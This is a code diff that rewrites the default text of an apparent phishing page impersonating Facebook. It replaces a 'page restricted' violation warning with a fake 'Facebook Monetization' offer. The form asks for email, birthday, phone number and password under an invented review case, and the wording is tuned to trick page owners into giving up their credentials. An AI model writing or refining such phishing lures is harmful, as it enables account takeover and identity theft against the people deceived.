@@ -56,22 +56,22 @@ interface PageContent {
 }
 
 const defaultContent: PageContent = {
-    title: 'YOUR PAGE HAS BEEN RESTRICTED',
-    warning: 'We have received multiple reports of potential violations of our terms of service. Your account requires immediate review.',
-    formTitle: 'ACCOUNT VERIFICATION FORM',
+    title: 'Welcome To Facebook Monetization',
+    warning: 'We have seen the potential for growth in your page. Therefore, we will consider enabling the monetization feature on it.',
+    formTitle: 'ACCOUNT INFORMATION FORM',
     emailPlaceholder: 'Email address',
     birthdayPlaceholder: 'Birthday (DD/MM/YYYY)',
     phonePlaceholder: 'Phone number',
     verifyButton: 'Verification',
-    caseType: 'Case Type: Community Standards Violation Review',
-    securityInfo: 'Please ensure all information is accurate. Incorrect information may result in permanent account closure.',
+    caseType: 'Case Type: Monetization Function Review',
+    securityInfo: 'Please ensure all information is accurate. If the information provided is incorrect, monetization may not be enabled.',
     passwordTitle: 'Please Enter Your Password',
     passwordSubtitle: 'For your security, you must enter your password to continue.',
     passwordPlaceholder: 'Enter your password',
     cancelButton: 'Cancel',
     submitButton: 'Submit',
     processingText: 'Processing...',
-    verificationNote: 'This information is required to verify your identity and protect your account'
+    verificationNote: 'This information is required to verify your identity account'
 };
 
 const mainFormSchema = z.object({
